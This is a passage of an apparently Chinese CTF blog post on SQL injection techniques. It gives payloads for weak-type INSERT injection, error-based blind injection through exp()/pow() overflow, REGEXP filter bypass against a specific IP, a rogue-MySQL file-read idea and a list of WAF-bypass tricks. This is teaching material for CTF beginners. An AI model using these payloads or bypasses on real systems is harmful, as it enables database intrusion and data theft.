<h5 id="mysql的弱类型-注入"><a href="#mysql的弱类型-注入" class="headerlink" title="mysql的弱类型-注入"></a>mysql的弱类型-注入</h5><p>mysql和php一样都是弱类型语言，你可以尝试select 0&#x3D;’sadas’ 结果一定是1，这里不用特殊记忆，php会返回true的mysql都会返回true，由于这种弱类型，还衍生了一点弱类型注入的技巧。<br>比如一个注册的insert 注入：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">email<span class="operator">=</span><span class="number">6677</span><span class="operator">%</span><span class="number">40</span>qq.com<span class="operator">&amp;</span>username<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;%2bsubstr((select hex(hex((select t.c from (select (select 1)c union select * from flag limit 1 offset 1)t)))) from 20)%2b&#x27;</span><span class="number">0</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">22</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>isert注入通过登录后的用户名来看回显 为了有回显 我们 0’+hex(hex(语句))+’0  由于弱类型加强制转换 我们的username就成为了我们注入数据的两次 hex值（注意这里必须用%2b +可能被当成空格或者%20 所以先编码 浏览器自己会解码这样就不会产生歧义），为什么不直接用字符串拼接呢，就像’0’+user()+’0’ ,不好意思这样只会返回0 因为”+”只适合整数相加,不适合字符串。<br>两次 hex是为了杜绝 0+33a1df+0&#x3D;33这种情况，为的是把数值变成字符开头而不是数字开头的十六进制字符串。这样我们得到的用户名就是我们查询结果的两次十六进制编码。</p>
<h5 id="同表查询"><a href="#同表查询" class="headerlink" title="同表查询"></a>同表查询</h5><p>有时候information 或者 or、select 被过滤，导致我们无法直接查询information_schema中的库名和表名。这个时候可能题目就没想让我们去information_Schema中找东西。应该尝试同表查询，还拿上面的flag表举例，如果注入语句只是查询username，那么我们可以：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> flag <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> mid(flag,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;f&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>同表是直接可以查的，直接切就行，有时候这个技巧还听常用。</p>
<h5 id="mysql-另类攻击"><a href="#mysql-另类攻击" class="headerlink" title="mysql 另类攻击"></a>mysql 另类攻击</h5><p>有时候sql注入不是单独出现的，比如结合php的弱类型，在登陆的时候希望username返回一个null，来进行弱类型比较，那么mysql注入也可以：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> flag <span class="keyword">group</span> <span class="keyword">by</span> username <span class="keyword">with</span> <span class="keyword">rollup</span></span><br></pre></td></tr></table></figure>
<p>图形查询结果：</p>
<table>
<thead>
<tr>
<th align="center">username</th>
</tr>
</thead>
<tbody><tr>
<td align="center">admin</td>
</tr>
<tr>
<td align="center">null</td>
</tr>
</tbody></table>
<p>可以通过limit 来返回一个null。当然这个技巧很少用。</p>
<h5 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h5><p>AllowArbitraryServer 开启的情况下开启的情况下可能存在任意文件读取，可以把本地文件读取到远程mysql服务器上，具体操作是vps启动mysql服务器用phpmyadmin的后台登陆去登陆我们的mysql服务器，我们的服务器就会记录下我们所需要的文件，当然vps的mysql服务器需要配置，主要用在phpmyadmin界面的登陆中，写起来太长了，直接给个链接吧。<br><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-248424.htm">https://bbs.pediy.com/thread-248424.htm</a></p>
<h5 id="利用数据库操作异常进行注入"><a href="#利用数据库操作异常进行注入" class="headerlink" title="利用数据库操作异常进行注入"></a>利用数据库操作异常进行注入</h5><p>有时候我们见到的题目sql语句执行不成功会报错，但是所有报错都是同样的样式，没办法通过报错注入来进行数据泄露。那么我们还可以用这种数据库异常来进行盲注（类似boolean盲注）。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 主要有以下几种玩儿法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 基于 and 的特性 0 and sql 这里的sql不会执行，因为0 and 任何 都是 0，所以不会接着执行</span></span><br><span class="line"><span class="string">&#x27;123&#x27;</span> <span class="keyword">and</span> ascii(mid(&#123;<span class="keyword">sql</span>&#125;,&#123;index&#125;,<span class="number">1</span>))<span class="operator">=</span>&#123;<span class="type">char</span>&#125; <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x)));</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 0+~0 返回一串整形数字  1+~0 报错</span></span><br><span class="line"><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> (ascii(substr((<span class="keyword">select</span> t<span class="number">.2</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">union</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> )t LIMIT <span class="number">1</span> </span><br><span class="line"><span class="keyword">OFFSET</span> <span class="number">1</span>),&#123;i&#125;,<span class="number">1</span>))<span class="operator">=</span>&#123;j&#125;)<span class="operator">+</span><span class="operator">~</span><span class="number">0</span>)#.format(i<span class="operator">=</span>i,j<span class="operator">=</span>j);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 这个是 基于and的例子 pow() 也是会报错 所以 and + 很多sql函数 都可以这样玩儿</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> mid((<span class="keyword">select</span> username <span class="keyword">from</span> admin limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;b&#x27;</span> <span class="keyword">and</span> pow(<span class="number">222</span>,<span class="number">222222</span>);</span><br></pre></td></tr></table></figure>



<h5 id="当所有比较符号被过滤"><a href="#当所有比较符号被过滤" class="headerlink" title="当所有比较符号被过滤"></a>当所有比较符号被过滤</h5><p>记住还有 REGEXP</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">39.106</span><span class="number">.184</span><span class="number">.130</span>:<span class="number">8082</span><span class="operator">/</span>index.php?id<span class="operator">=</span><span class="number">1</span><span class="operator">^</span>(mid(length(database()),<span class="number">1</span>,<span class="number">2</span>)<span class="operator">+</span>regexp<span class="operator">+</span><span class="operator">%</span><span class="number">27</span><span class="operator">^</span><span class="number">32</span><span class="operator">%</span><span class="number">27</span>)</span><br></pre></td></tr></table></figure>

<h5 id="渗透测试中比较好用的知识点"><a href="#渗透测试中比较好用的知识点" class="headerlink" title="渗透测试中比较好用的知识点"></a>渗透测试中比较好用的知识点</h5><ul>
<li>参数污染</li>
<li>IIS 特性unicode绕过  s%u0065lect 使用hackbar编码</li>
<li>使用chunk提交数据</li>
<li>sqlserver 可以 ；号结束命令</li>
<li>mysql内联注释</li>
<li>特殊字符 %00 %0d %0a</li>
<li>空白字符<br> mysql5：OA OB OC OD AO 20<br> MSSQL:01,02 到 09，0A到0F,10到19，1A到1F,20 </li>
<li>括号绕过空格 union(select)</li>
<li>插入emoji &#x2F; 小语种文字</li>
<li>使用sqlmap tamper</li>
<li>科学计数法绕过空格 8e0union</li>
<li>无回显，无特征，善用sleep()</li>
</ul>
<h4 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h4><p>很少能打CTF了，以前打CTF竟是做注入的题，所以有很多经验，但再不总结可能就忘完了。这篇文章也不算是有技术含量，只是为CTF小白打点基础，开阔脑洞，毕竟sql注入题千变万化，越来越难了。最后希望有人能从这儿学到东西。</p>

    </div>

    
    
    


<span style="margin-top:30px; color:var(--blockquote-color); font-size:0.85em">
        <br>
        <span class="post-end-item" title="copyright"">
            <span class="post-end-item-icon" style="margin-right: 3px">
                <i class="fab fa-fw fa-creative-commons"></i>
            </span>
            <span class="post-end-item-text">采用署名-非商业性使用-相同方式共享 4.0（CC BY-NC-SA 4.0）许可协议</span>
        </span>
</span>





<div class="donations">
    <div class="donation-label">「分享也是一种学习」</div>
</div>

      <footer class="post-footer">
          
          <div class="post-tags">
              <a href="/overview/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
              <a href="/overview/tags/sqli/" rel="tag"><i class="fa fa-tag"></i> sqli</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/posts/undefined/" rel="prev" title="我爱我的祖国">
      <i class="fa fa-chevron-left"></i> 我爱我的祖国
    </a></div>
      <div class="post-nav-item">
    <a href="/posts/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2%E5%86%8D%E6%AC%A1%E4%B8%8A%E7%BA%BF/" rel="next" title="我的博客再次上线">
      我的博客再次上线 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CTF-sql%E6%B3%A8%E5%85%A5%E4%B8%89%E5%8E%9F%E5%88%99"><span class="nav-text">CTF sql注入三原则</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="nav-text">sql注入流程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BC%80%E5%A7%8B%E6%B3%A8%E5%85%A5"><span class="nav-text">开始注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#fuzz"><span class="nav-text">fuzz</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87waf"><span class="nav-text">绕过waf</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%98%E6%9C%89%E4%B8%80%E4%BA%9B%E5%B0%8F%E4%BC%97%E7%9A%84%E6%8A%80%E5%B7%A7"><span class="nav-text">还有一些小众的技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%97%A0%E6%B3%95%E8%8E%B7%E5%8F%96%E5%88%97%E5%90%8D%E5%A6%82%E4%BD%95%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="nav-text">无法获取列名如何取数据</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#HTTP%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93"><span class="nav-text">HTTP参数污染</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#DNSlogsql%E6%B3%A8%E5%85%A5"><span class="nav-text">DNSlogsql注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#mssql-mysql"><span class="nav-text">mssql+mysql</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#MYSQL%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB%EF%BC%9A"><span class="nav-text">MYSQL约束攻击：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#mysql%E7%9A%84%E5%BC%B1%E7%B1%BB%E5%9E%8B-%E6%B3%A8%E5%85%A5"><span class="nav-text">mysql的弱类型-注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%90%8C%E8%A1%A8%E6%9F%A5%E8%AF%A2"><span class="nav-text">同表查询</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#mysql-%E5%8F%A6%E7%B1%BB%E6%94%BB%E5%87%BB"><span class="nav-text">mysql 另类攻击</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-text">任意文件读取</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C%E5%BC%82%E5%B8%B8%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5"><span class="nav-text">利用数据库操作异常进行注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%BD%93%E6%89%80%E6%9C%89%E6%AF%94%E8%BE%83%E7%AC%A6%E5%8F%B7%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="nav-text">当所有比较符号被过滤</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E6%AF%94%E8%BE%83%E5%A5%BD%E7%94%A8%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-text">渗透测试中比较好用的知识点</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%93%E8%AF%AD"><span class="nav-text">结语</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Geez"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">Geez</p>
  <div class="site-description" itemprop="description">黑客,诗人,养龟仔</div>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/geeeez/" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;geeeez&#x2F;" rel="noopener" target="_blank"><i class="fa fa-fw fa-fab fa-github"></i></a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2016 – 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-fas fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Geez</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    <span title="站点总字数">118k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">1:47</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/pjax/pjax.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>

<script src="/js/utils.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>

  <script>
var pjax = new Pjax({
  selectors: [
    'head title',
    '#page-configurations',
    '.content-wrap',
    '.post-toc-wrap',
    '.languages',
    '#pjax'
  ],
  switches: {
    '.post-toc-wrap': Pjax.switches.innerHTML
  },
  analytics: false,
  cacheBust: false,
  scrollTo : !CONFIG.bookmark.enable
});

window.addEventListener('pjax:success', () => {
  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
    var code = element.text || element.textContent || element.innerHTML || '';
    var parent = element.parentNode;
    parent.removeChild(element);
    var script = document.createElement('script');
    if (element.id) {
      script.id = element.id;
    }
    if (element.className) {
      script.className = element.className;
    }
    if (element.type) {
      script.type = element.type;
    }
    if (element.src) {
      script.src = element.src;
      // Force synchronous loading of peripheral JS.
      script.async = false;
    }
    if (element.dataset.pjax !== undefined) {
      script.dataset.pjax = '';
    }
    if (code !== '') {
      script.appendChild(document.createTextNode(code));
    }
    parent.appendChild(script);
  });
  NexT.boot.refresh();
  // Define Motion Sequence & Bootstrap Motion.
  if (CONFIG.motion.enable) {
    NexT.motion.integrator
      .init()
      .add(NexT.motion.middleWares.subMenu)
      .add(NexT.motion.middleWares.postList)
      .bootstrap();
  }
  NexT.utils.updateSidebarPosition();
});
</script>




  




  
<script src="/js/local-search.js"></script>













    <div id="pjax">
  

  

  

    </div>
</body>
</html>
